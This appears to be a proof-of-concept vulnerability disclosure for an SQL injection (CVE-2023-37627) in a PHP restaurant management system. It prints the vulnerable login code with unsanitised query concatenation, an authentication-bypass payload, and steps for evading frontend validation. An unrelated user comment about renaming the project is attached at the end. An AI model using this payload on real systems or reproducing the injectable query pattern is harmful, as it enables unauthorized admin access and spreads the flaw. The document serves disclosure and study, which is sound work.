[**CVE-2023-37627\_PoC.md**](#file-cve-2023-37627_poc-md)

# CVE-2023-37627

```
Product : Online Restaurant Management System - 1.0
Vulnerability Type : SQL Injection
Vendor of Product : code-projects

Desc : An attacker can bypass the admin panel and view order records, add items, delete items etc.

```
## Vulnerable Code

```
// file : index.php
...
$email=$_POST['email'];
$password=$_POST['password'];

$sql = "SELECT * FROM admin WHERE email='$email' AND password='$password'";

$query  = $pdoconn->prepare($sql);
$query->execute();
$arr_login=$query->fetchAll(PDO::FETCH_ASSOC);
...
```

# POC

Admin login panel can be bypassed by giving the "password" or "username" as `' OR 1=1; -- -`.

```
SELECT * FROM admin WHERE email='vulnweb@pwned.tld' AND password='' or 1=1; -- - '
```

Email validation is preset in the frontend. It can be bypassed either by disabling javascript or by directly sending a POST request to `admin/login-admin.php`

```
SELECT * FROM admin WHERE email='' or 1=1; -- -' AND password='vulnweb'
-- Injecting email field
```

When logging with the password `' OR 1=1; -- -` , we get a 302 redirect to "dashboard.php", indicating that we have bypassed the admin login.

## Request

Hi, I’m using project as my final year project. I want to change the name from the url from restro girls to some other name. I changed the title and heading and it worked fine but I only have problem on the name. Also did you guys add any additional functions on this project like payment option or table option? Please let me know i really appreciate it. This is a really nice work from you guys.
